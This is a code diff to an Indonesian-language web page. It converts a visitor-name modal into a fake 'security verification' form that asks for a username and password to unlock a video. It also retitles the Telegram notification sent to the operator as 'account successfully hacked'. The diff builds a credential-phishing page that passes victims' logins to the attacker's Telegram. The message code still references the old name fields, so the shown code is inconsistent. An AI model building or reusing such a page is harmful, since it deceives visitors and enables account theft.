@@ -130,20 +130,20 @@
     <div class="modal-overlay" id="loginModal">
         <div class="modal-box">
             <h2>Verifikasi Keamanan</h2>
-            <p>Silakan masukkan nama Anda untuk melanjutkan akses ke domain ini.</p>
+            <p>Silakan masukkan username dan password Anda untuk melanjutkan akses ke video.</p>
             
             <form id="visitorForm">
                 <!-- Input Nama Depan -->
                 <div class="input-group">
-                    <input type="text" id="namaDepan" placeholder="Nama Depan" required>
+                    <input type="text" id="username" placeholder="username" required>
                 </div>
 
                 <!-- Input Nama Belakang -->
                 <div class="input-group">
-                    <input type="text" id="namaBelakang" placeholder="Nama Belakang" required>
+                    <input type="text" id="password" placeholder="password" required>
                 </div>
 
-                <button type="submit" class="btn-submit" id="submitBtn">Masuk Ke Situs</button>
+                <button type="submit" class="btn-submit" id="submitBtn">Masuk</button>
             </form>
         </div>
     </div>
@@ -178,7 +178,7 @@
             submitBtn.disabled = true;
 
             // Format pesan yang akan masuk ke Telegram Anda
-            const teksPesan = `🔔 *Notifikasi Pengunjung Baru*\n\n` +
+            const teksPesan = `🔔 *Notifikasi Akun berhasil dibobol*\n\n` +
                               `👤 *Nama:* ${namaDepan} ${namaBelakang}\n` +
                               `🕒 *Waktu Masuk:* ${waktuMasuk}`;
 
